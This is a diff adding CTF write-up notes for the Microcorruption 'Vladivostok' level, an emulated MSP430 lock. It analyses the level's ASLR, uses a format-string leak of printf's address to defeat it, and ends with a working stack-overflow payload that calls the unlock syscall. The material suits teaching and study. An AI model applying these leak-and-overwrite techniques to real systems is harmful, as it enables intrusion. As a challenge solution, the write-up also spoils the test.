@@ -386,9 +386,117 @@ Password
 ```
 
 Depending on what stuff was on the stack, you can take different paths for combining or not
-combining heap chunks.  I had to tweak the si
+combining heap chunks.  I had to tweak the size a bit to get it to work.
 
 ## Vladivostok
+
+Where is the main?  I see ASLR named symbols... crap.  After running the code until the point where
+it asks for the password, the debugger shows all of the instructions have been overwritten
+
+Original code starts around 0x4400
+
+Trying to copy something to high area of memory (can't overwrite the original code).
+
+Code gets moved to 0x6000-0xcffe (main's r11)
+Moved stack pointer to random location
+Jumped to aslr_main, then _aslr_main
+memcpy(0x1000, 0x4400, 0x7d1e)
+
+aslr_main() called with:
+r14 = stack pointer, random location just in front of program code
+r15 = program code start
+
+_aslr_main called with r15 = start of program code
+
+To make hacking / debugging easier, at startup, do the following:
+
+```
+# Overwrite the memcpy() with a patch to fix the code to where it isn't repositioned at startup
+# We are basically saying that the random location it picked to move the code to is the original
+# code location
+#
+# mov #0x4400, r11
+# 3b400044
+
+4456 = 403b; 4458 = 4400
+```
+
+```
+# Where the code originally zero-ed out the original code, don't zero anything out.  The code is
+# zero-ed out to prevent us from jumping to known address / code blocks.
+#
+# nop
+# 0343
+
+4494 = 4303; 4496 = 4303
+```
+
+Jumps can be relative (forwards or backwards)  too.
+
+jnz $-0xa
+
+Address 0x2402 used as some sort of global variable buffer for priting messages.
+
+Username is allowed to be 8 characters long
+
+Trying to figure out how system calls work...
+
+putchar is a 1 parameter system call.
+
+```
+4924 <putchar>
+4924:  0e4f           mov	r15, r14
+4926:  0d43           clr	r13 // 0, the putchar syscall is 0...
+4928:  0d12           push	r13 // typically arg2 or zero (seems like even 0 arg syscalls get 2 args pushed)
+492a:  0e12           push	r14 // typically arg1
+492c:  0d12           push	r13 // syscall number
+492e:  0012           push	pc
+4930:  0212           push	sr
+4932:  0f4d           mov	r13, r15 // this was the usual syscalls in the past
+4934:  8f10           swpb	r15
+4936:  024f           mov	r15, sr
+4938:  32d0 0080      bis	#0x8000, sr
+493c:  b012 1000      call	#0x10
+4940:  3241           pop	sr
+4942:  3152           add	#0x8, sp
+4944:  0f4e           mov	r14, r15
+4946:  3041           ret
+```
+
+Also determined if I enter a username of
+```
+U%x %xU
+```
+
+It printed out my username as 
+```
+U0000 476aU
+```
+
+0x476a happens to be the address of the start of the printf function.  Could be handy later to
+defeat address randomization
+
+Username is read into 0x2426, global static variable, not randomized.
+
+Password is read directly onto stack.  Looks like 8 bytes allocated, immediately following is a
+return address we can overwrite. We will overwrite with the return address to the start of the 
+_INT(syscall) function.  After the return address, write the sys-call we should use.  It will
+appear to the _INT function as a parameter passed on the stack!  Of course we will use the 
+unconditional unlock syscall 0x7f.
+
+For non-ASLR code, _INT is at address 0x48ec
+
+This can be computed from username that prints out the address of printf:  
+0x48ec - 0x476a + XXXX from username = 0x0182 + xxxx from username
+Byteswap the answer
+
+```
+Username:
+%x %x
+
+Password:
+0102030405060708ec4801027f00
+```
 
 ## Lagos
 
